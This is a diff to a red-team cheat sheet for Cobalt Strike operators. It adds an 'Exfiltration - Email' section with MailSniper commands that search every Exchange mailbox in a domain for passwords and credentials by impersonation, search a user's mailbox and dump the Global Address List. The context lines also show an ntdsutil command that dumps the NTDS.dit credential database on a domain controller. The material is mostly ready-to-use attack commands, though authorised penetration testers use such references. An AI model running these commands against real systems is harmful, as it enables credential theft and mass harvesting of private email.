@@ -9,6 +9,7 @@
 - [Defense Evasion](#defense-evasion)
 - [Exploitation](#exploitation)
 - [Exfiltration - Password Attacks](#exfiltration---password-attacks)
+- [Exfiltration - Email](#exfiltration---email)
 - [Persistence](#persistence)
 - [Cobalt Strike BOFs](#cobalt-strike-bofs)
 - [References](#references)
@@ -551,6 +552,23 @@ powerpick Copy-VSS -DestinationDir C:\temp
 NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
 ```
 run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
+```
+------------------------------------------------------------------------------------------
+## Exfiltration - Email
+
+### [MailSniper](https://github.com/dafthack/MailSniper)
+PowreShell tool to search mailboxes in a Microsoft Exchange environment
+```
+powershell-import -> Select MailSniper.ps1
+
+# Search all mailboxes in a domain - Looks for "*password*","*creds*","*credentials*"
+powershell Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname ExchangeHost.domain.com -OutputCsv global-email-search.csv
+
+# Search the current users mailbox
+powershell Invoke-SelfSearch -Mailbox current-user@domain.com
+
+# Get the Global Address List (GAL)
+powershell Get-GlobalAddressList -ExchHostname ExchangeHost.domain.com -UserName domain\username -Password P@ssw0rd! -OutFile gal.txt
 ```
 ------------------------------------------------------------------------------------------
 ## Persistence
